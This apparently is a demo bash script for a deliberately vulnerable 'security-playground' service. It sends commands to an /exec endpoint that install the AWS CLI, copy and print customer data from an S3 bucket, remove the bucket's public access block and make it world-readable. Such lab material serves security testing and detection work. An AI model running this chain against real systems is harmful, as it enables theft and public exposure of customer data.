#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30000

echo "Install the AWS CLI"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o awscliv2.zip"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=unzip awscliv2.zip"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=./aws/install"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=/usr/local/bin/aws --version"
echo "Look at the sensitive data"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=aws s3 cp s3://$S3_BUCKET_NAME/customer-data.txt ."
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=cat customer-data.txt"
echo "Remove the Public Access Block on our bucket $S3_BUCKET_NAME"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=aws s3api delete-public-access-block --bucket $S3_BUCKET_NAME"
echo "Set a Bucket Policy to make the bucket public"
POLICY="{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$S3_BUCKET_NAME/*\"}]}"
POLICY_COMMAND="command=aws s3api put-bucket-policy --bucket $S3_BUCKET_NAME --policy '"$POLICY"'"
curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "$POLICY_COMMAND"
